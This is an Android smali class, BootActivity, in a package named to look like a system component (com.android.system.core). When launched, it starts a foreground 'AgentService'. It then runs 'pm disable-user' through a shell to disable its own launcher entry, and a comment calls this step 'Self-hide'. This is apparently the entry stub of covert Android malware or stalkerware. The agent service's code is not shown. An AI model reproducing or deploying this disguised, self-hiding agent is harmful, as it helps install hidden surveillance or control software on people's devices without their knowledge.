.class public Lcom/android/system/core/BootActivity;
.super Landroid/app/Activity;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Start AgentService
    :try_svc
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/android/system/core/AgentService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_svc_end
    .catch Ljava/lang/Exception; {:try_svc .. :try_svc_end} :catch_svc
    :catch_svc

    # Self-hide: disable launcher icon via pm disable-user
    :try_hide
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    const/4 v1, 0x3
    new-array v1, v1, [Ljava/lang/String;
    const-string v2, "/system/bin/sh"
    const/4 v3, 0x0
    aput-object v2, v1, v3
    const-string v2, "-c"
    const/4 v3, 0x1
    aput-object v2, v1, v3
    const-string v2, "pm disable-user --user 0 com.android.system.core/com.android.system.core.BootActivity"
    const/4 v3, 0x2
    aput-object v2, v1, v3
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    :try_hide_end
    .catch Ljava/lang/Exception; {:try_hide .. :try_hide_end} :catch_hide
    :catch_hide

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method
